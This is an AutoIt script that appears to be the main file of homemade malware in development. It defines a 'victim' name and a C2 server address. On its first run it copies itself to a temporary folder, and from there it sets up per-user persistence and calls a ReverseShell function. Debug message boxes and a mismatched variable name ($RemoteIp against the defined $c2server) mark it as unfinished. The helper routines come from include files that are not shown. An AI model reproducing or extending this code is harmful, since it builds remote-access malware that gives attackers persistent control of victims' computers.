#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "test"
$c2server = "192.168.0.1"

MessageBox("Debug",@ScriptDir & "\" & @ScriptName)

if isRunningFromTemp() Then

   MessageBox("Debug","I am now running from Temp and I know it")

   SetPersistent4CurrentUser()

   ReverseShell($RemoteIp)

Else

			MessageBox("Debug","orginal run")

			CopyTempRun()

EndIf